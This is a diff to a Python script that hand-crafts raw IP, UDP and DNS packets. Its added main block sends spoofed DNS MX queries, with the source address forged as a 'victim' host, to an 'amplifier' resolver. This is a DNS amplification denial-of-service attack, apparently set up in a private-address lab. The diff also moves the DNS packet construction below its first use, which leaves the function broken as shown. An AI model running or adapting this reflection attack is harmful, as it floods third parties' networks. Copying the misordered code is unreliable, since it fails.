@@ -13,6 +13,7 @@ class QTYPE(Enum):
     SOA     = 6
     TXT     = 16
 
+
 def compute_checksum(msg):
     checksum = 0
     for i in range(0, len(msg), 2):
@@ -29,7 +30,6 @@ def compute_checksum(msg):
 
 def pack_ip_packet(**kwargs):
     """
-    https://www.tutorialspoint.com/ipv4/ipv4_packet_structure.htm
     version - ihl   : B  (1 byte)
     dscp - ecn      : B  (1 byte)
     total length    : H  (2 bytes)
@@ -40,6 +40,9 @@ def pack_ip_packet(**kwargs):
     header checksum : H  (2 bytes)
     source address  : 4s (4 bytes)
     dest address    : 4s (4 bytes)
+
+    References:
+        https://www.tutorialspoint.com/ipv4/ipv4_packet_structure.htm
     """
 
     version_ihl = (kwargs["version"] << 4) | kwargs["ihl"]
@@ -77,7 +80,6 @@ def pack_udp_packet(**kwargs):
 
 def pack_dns_header(**kwargs):
     """
-    https://www2.cs.duke.edu/courses/fall16/compsci356/DNS/DNS-primer.pdf
     id      : H (2 bytes)
     qr      : 1 bit
     opcode  : 4 bits
@@ -94,6 +96,10 @@ def pack_dns_header(**kwargs):
 
     qname   : str
     qtype   : QTYPE
+
+    References:
+        https://www2.cs.duke.edu/courses/fall16/compsci356/DNS/DNS-primer.pdf
+        https://routley.io/posts/hand-writing-dns-messages/
     """
 
     second_row = \
@@ -223,7 +229,6 @@ def make_dns_query(**kwargs):
         qname
         qtype
     """
-    dns_packet = make_dns_packet(qname=kwargs["qname"], qtype=kwargs["qtype"])
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
@@ -232,5 +237,24 @@ def make_dns_query(**kwargs):
 
     udp_packet = make_udp_packet(src_port=kwargs["src_port"], dest_port=kwargs["dest_port"], payload=dns_packet)
     ip_packet = make_ip_packet(src_addr=kwargs["src_addr"], dest_addr=kwargs["dest_addr"], payload=udp_packet)
+    dns_packet = make_dns_packet(qname=kwargs["qname"], qtype=kwargs["qtype"])
 
     return sock.sendto(ip_packet + udp_packet + dns_packet, (kwargs["dest_addr"], kwargs["dest_port"]))
+
+
+if __name__ == "__main__":
+    ADDRS = {
+        "victim": "192.168.30.1",
+        "amplifier": "192.168.20.1",
+        "attacker": "192.168.10.1"
+    }
+
+    for _ in range(15):
+        make_dns_query(
+            src_addr=ADDRS["victim"],
+            dest_addr=ADDRS["amplifier"],
+            src_port=5000,
+            dest_port=53,
+            qname="apple.com",
+            qtype=QTYPE.MX
+        )
